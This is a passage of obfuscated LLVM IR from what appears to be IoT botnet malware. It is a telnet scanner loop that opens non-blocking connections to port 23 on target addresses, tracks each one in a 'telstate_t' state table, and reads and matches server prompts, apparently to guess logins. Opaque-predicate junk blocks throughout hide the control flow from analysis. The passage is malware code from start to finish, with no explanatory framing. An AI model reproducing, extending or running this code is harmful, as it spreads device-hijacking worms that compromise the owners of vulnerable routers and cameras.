; <label>:257:                                    ; preds = %originalBBpart233
  br label %258

; <label>:258:                                    ; preds = %257, %151
  %259 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %259, align 4
  %260 = call zeroext i16 @htons(i16 zeroext 23) #13
  %261 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %260, i16* %261, align 2
  %262 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %263 = getelementptr inbounds [8 x i8], [8 x i8]* %262, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %263, i8 0, i64 8, i32 4, i1 false)
  %264 = load i32, i32* %2, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %265
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %266, i32 0, i32 1
  %268 = load i32, i32* %267, align 4
  %269 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %270 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %269, i32 0, i32 0
  store i32 %268, i32* %270, align 4
  %271 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %272 = load i32, i32* %2, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %273
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %274, i32 0, i32 0
  store i32 %271, i32* %275, align 16
  %276 = load i32, i32* %2, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 16
  %281 = icmp eq i32 %280, -1
  br i1 %281, label %282, label %283

; <label>:282:                                    ; preds = %258
  br label %2959

; <label>:283:                                    ; preds = %258
  %284 = load i32, i32* %2, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = load i32, i32* %2, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %290
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 16
  %294 = call i32 (i32, i32, ...) @fcntl(i32 %293, i32 3, i8* null)
  %295 = or i32 %294, 2048
  %296 = call i32 (i32, i32, ...) @fcntl(i32 %288, i32 4, i32 %295)
  %297 = load i32, i32* %2, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 0
  %301 = load i32, i32* %300, align 16
  %302 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %303 = call i32 @connect(i32 %301, %struct.sockaddr* %302, i32 16)
  %304 = icmp eq i32 %303, -1
  br i1 %304, label %305, label %336

; <label>:305:                                    ; preds = %283
  %306 = call i32* @__errno_location() #13
  %307 = load i32, i32* %306, align 4
  %308 = icmp ne i32 %307, 115
  br i1 %308, label %309, label %336

; <label>:309:                                    ; preds = %305
  %310 = load i32, i32* @x.63
  %311 = load i32, i32* @y.64
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %309
  %318 = load i32, i32* %2, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %319
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %320, i32 0, i32 0
  %322 = load i32, i32* %321, align 16
  %323 = call i32 @sclose(i32 %322)
  %324 = load i32, i32* %2, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 3
  store i8 1, i8* %327, align 1
  %328 = load i32, i32* @x.63
  %329 = load i32, i32* @y.64
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %345

; <label>:336:                                    ; preds = %305, %283
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 2
  store i8 1, i8* %340, align 8
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 6
  store i32 0, i32* %344, align 4
  br label %345

; <label>:345:                                    ; preds = %336, %originalBBpart241
  %346 = load i32, i32* @x.63
  %347 = load i32, i32* @y.64
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %345
  %354 = load i32, i32* @x.63
  %355 = load i32, i32* @y.64
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %2958

; <label>:362:                                    ; preds = %originalBBpart223
  %363 = load i32, i32* %2, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %364
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %365, i32 0, i32 6
  %367 = load i32, i32* %366, align 4
  %368 = icmp eq i32 %367, 0
  br i1 %368, label %369, label %391

; <label>:369:                                    ; preds = %362
  %370 = load i32, i32* @x.63
  %371 = load i32, i32* @y.64
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %369
  %378 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %379 = load i32, i32* %2, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 6
  store i32 %378, i32* %382, align 4
  %383 = load i32, i32* @x.63
  %384 = load i32, i32* @y.64
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %391

; <label>:391:                                    ; preds = %originalBBpart249, %362
  br label %392

; <label>:392:                                    ; preds = %391
  %393 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %394 = getelementptr inbounds [16 x i64], [16 x i64]* %393, i64 0, i64 0
  %395 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %394) #2, !srcloc !5
  %396 = extractvalue { i64, i64* } %395, 0
  %397 = extractvalue { i64, i64* } %395, 1
  %398 = trunc i64 %396 to i32
  store i32 %398, i32* %12, align 4
  %399 = ptrtoint i64* %397 to i64
  %400 = trunc i64 %399 to i32
  store i32 %400, i32* %13, align 4
  br label %401

; <label>:401:                                    ; preds = %392
  %402 = load i32, i32* @x.63
  %403 = load i32, i32* @y.64
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %401
  %410 = load i32, i32* @x.63
  %411 = load i32, i32* @y.64
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %418

; <label>:418:                                    ; preds = %originalBBpart253
  %419 = load i32, i32* %2, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 16
  %424 = srem i32 %423, 64
  %425 = zext i32 %424 to i64
  %426 = shl i64 1, %425
  %427 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %428 = load i32, i32* %2, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 0
  %432 = load i32, i32* %431, align 16
  %433 = sdiv i32 %432, 64
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds [16 x i64], [16 x i64]* %427, i64 0, i64 %434
  %436 = load i64, i64* %435, align 8
  %437 = or i64 %436, %426
  store i64 %437, i64* %435, align 8
  %438 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %438, align 8
  %439 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %439, align 8
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 0
  %444 = load i32, i32* %443, align 16
  %445 = add nsw i32 %444, 1
  %446 = call i32 @select(i32 %445, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %446, i32* %3, align 4
  %447 = load i32, i32* %3, align 4
  %448 = icmp eq i32 %447, 1
  br i1 %448, label %449, label %522

; <label>:449:                                    ; preds = %418
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %450 = load i32, i32* %2, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %451
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %452, i32 0, i32 0
  %454 = load i32, i32* %453, align 16
  %455 = bitcast i32* %7 to i8*
  %456 = call i32 @getsockopt(i32 %454, i32 1, i32 4, i8* %455, i32* %6) #2
  %457 = load i32, i32* %7, align 4
  %458 = icmp ne i32 %457, 0
  br i1 %458, label %459, label %490

; <label>:459:                                    ; preds = %449
  %460 = load i32, i32* @x.63
  %461 = load i32, i32* @y.64
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %459
  %468 = load i32, i32* %2, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 0
  %472 = load i32, i32* %471, align 16
  %473 = call i32 @sclose(i32 %472)
  %474 = load i32, i32* %2, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 2
  store i8 0, i8* %477, align 8
  %478 = load i32, i32* %2, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 3
  store i8 1, i8* %481, align 1
  %482 = load i32, i32* @x.63
  %483 = load i32, i32* @y.64
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %521

; <label>:490:                                    ; preds = %449
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 0
  %495 = load i32, i32* %494, align 16
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 16
  %501 = call i32 (i32, i32, ...) @fcntl(i32 %500, i32 3, i8* null)
  %502 = and i32 %501, -2049
  %503 = call i32 (i32, i32, ...) @fcntl(i32 %495, i32 4, i32 %502)
  %504 = load i32, i32* %2, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %505
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %506, i32 0, i32 6
  store i32 0, i32* %507, align 4
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 7
  store i16 0, i16* %511, align 16
  %512 = load i32, i32* %2, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 8
  %516 = load i8*, i8** %515, align 8
  call void @llvm.memset.p0i8.i64(i8* %516, i8 0, i64 1024, i32 1, i1 false)
  %517 = load i32, i32* %2, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 2
  store i8 2, i8* %520, align 8
  br label %2959

; <label>:521:                                    ; preds = %originalBBpart257
  br label %573

; <label>:522:                                    ; preds = %418
  %523 = load i32, i32* %3, align 4
  %524 = icmp eq i32 %523, -1
  br i1 %524, label %525, label %556

; <label>:525:                                    ; preds = %522
  %526 = load i32, i32* @x.63
  %527 = load i32, i32* @y.64
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %525
  %534 = load i32, i32* %2, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %535
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %536, i32 0, i32 0
  %538 = load i32, i32* %537, align 16
  %539 = call i32 @sclose(i32 %538)
  %540 = load i32, i32* %2, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 2
  store i8 0, i8* %543, align 8
  %544 = load i32, i32* %2, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %545
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %546, i32 0, i32 3
  store i8 1, i8* %547, align 1
  %548 = load i32, i32* @x.63
  %549 = load i32, i32* @y.64
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %556

; <label>:556:                                    ; preds = %originalBBpart261, %522
  %557 = load i32, i32* @x.63
  %558 = load i32, i32* @y.64
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %556
  %565 = load i32, i32* @x.63
  %566 = load i32, i32* @y.64
  %567 = sub i32 %565, 1
  %568 = mul i32 %565, %567
  %569 = urem i32 %568, 2
  %570 = icmp eq i32 %569, 0
  %571 = icmp slt i32 %566, 10
  %572 = or i1 %570, %571
  br i1 %572, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %573

; <label>:573:                                    ; preds = %originalBBpart265, %521
  %574 = load i32, i32* %2, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 6
  %578 = load i32, i32* %577, align 4
  %579 = add i32 %578, 10
  %580 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %581 = icmp ult i32 %579, %580
  br i1 %581, label %582, label %597

; <label>:582:                                    ; preds = %573
  %583 = load i32, i32* %2, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 0
  %587 = load i32, i32* %586, align 16
  %588 = call i32 @sclose(i32 %587)
  %589 = load i32, i32* %2, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %590
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %591, i32 0, i32 2
  store i8 0, i8* %592, align 8
  %593 = load i32, i32* %2, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 3
  store i8 1, i8* %596, align 1
  br label %597

; <label>:597:                                    ; preds = %582, %573
  %598 = load i32, i32* @x.63
  %599 = load i32, i32* @y.64
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %597
  %606 = load i32, i32* @x.63
  %607 = load i32, i32* @y.64
  %608 = sub i32 %606, 1
  %609 = mul i32 %606, %608
  %610 = urem i32 %609, 2
  %611 = icmp eq i32 %610, 0
  %612 = icmp slt i32 %607, 10
  %613 = or i1 %611, %612
  br i1 %613, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %2958

; <label>:614:                                    ; preds = %originalBBpart223
  %615 = load i32, i32* %2, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %616
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %617, i32 0, i32 6
  %619 = load i32, i32* %618, align 4
  %620 = icmp eq i32 %619, 0
  br i1 %620, label %621, label %627

; <label>:621:                                    ; preds = %614
  %622 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 6
  store i32 %622, i32* %626, align 4
  br label %627

; <label>:627:                                    ; preds = %621, %614
  %628 = load i32, i32* %2, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 0
  %632 = load i32, i32* %631, align 16
  %633 = load i32, i32* %2, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 8
  %637 = load i8*, i8** %636, align 8
  %638 = load i32, i32* %2, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 7
  %642 = load i16, i16* %641, align 16
  %643 = zext i16 %642 to i32
  %644 = call i32 @readUntil(i32 %632, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %637, i32 1024, i32 %643)
  %645 = icmp ne i32 %644, 0
  br i1 %645, label %646, label %694

; <label>:646:                                    ; preds = %627
  %647 = load i32, i32* %2, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %648
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %649, i32 0, i32 6
  store i32 0, i32* %650, align 4
  %651 = load i32, i32* %2, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %652
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %653, i32 0, i32 7
  store i16 0, i16* %654, align 16
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 8
  %659 = load i8*, i8** %658, align 8
  %660 = call i8* @strstr(i8* %659, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %661 = icmp ne i8* %660, null
  br i1 %661, label %662, label %667

; <label>:662:                                    ; preds = %646
  %663 = load i32, i32* %2, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 2
  store i8 5, i8* %666, align 8
  br label %672

; <label>:667:                                    ; preds = %646
  %668 = load i32, i32* %2, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 2
  store i8 3, i8* %671, align 8
  br label %672

; <label>:672:                                    ; preds = %667, %662
  %673 = load i32, i32* @x.63
  %674 = load i32, i32* @y.64
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %672
  %681 = load i32, i32* %2, align 4
  %682 = sext i32 %681 to i64
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %682
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %683, i32 0, i32 8
  %685 = load i8*, i8** %684, align 8
  call void @llvm.memset.p0i8.i64(i8* %685, i8 0, i64 1024, i32 1, i1 false)
  %686 = load i32, i32* @x.63
  %687 = load i32, i32* @y.64
  %688 = sub i32 %686, 1
  %689 = mul i32 %686, %688
  %690 = urem i32 %689, 2
  %691 = icmp eq i32 %690, 0
  %692 = icmp slt i32 %687, 10
  %693 = or i1 %691, %692
  br i1 %693, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %2959

; <label>:694:                                    ; preds = %627
  %695 = load i32, i32* %2, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 0
  %699 = load i32, i32* %698, align 16
  %700 = load i32, i32* %2, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 8
  %704 = load i8*, i8** %703, align 8
  %705 = load i32, i32* %2, align 4
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %706
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %707, i32 0, i32 7
  %709 = load i16, i16* %708, align 16
  %710 = zext i16 %709 to i32
  %711 = call i32 @readUntil(i32 %699, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %704, i32 1024, i32 %710)
  %712 = icmp ne i32 %711, 0
  br i1 %712, label %713, label %781

; <label>:713:                                    ; preds = %694
  %714 = load i32, i32* %2, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 6
  store i32 0, i32* %717, align 4
  %718 = load i32, i32* %2, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 7
  store i16 0, i16* %721, align 16
  %722 = load i32, i32* %2, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 8
  %726 = load i8*, i8** %725, align 8
  %727 = call i8* @strstr(i8* %726, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %728 = icmp ne i8* %727, null
  br i1 %728, label %729, label %750

; <label>:729:                                    ; preds = %713
  %730 = load i32, i32* @x.63
  %731 = load i32, i32* @y.64
  %732 = sub i32 %730, 1
  %733 = mul i32 %730, %732
  %734 = urem i32 %733, 2
  %735 = icmp eq i32 %734, 0
  %736 = icmp slt i32 %731, 10
  %737 = or i1 %735, %736
  br i1 %737, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %729
  %738 = load i32, i32* %2, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 2
  store i8 5, i8* %741, align 8
  %742 = load i32, i32* @x.63
  %743 = load i32, i32* @y.64
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %771

; <label>:750:                                    ; preds = %713
  %751 = load i32, i32* @x.63
  %752 = load i32, i32* @y.64
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %750
  %759 = load i32, i32* %2, align 4
  %760 = sext i32 %759 to i64
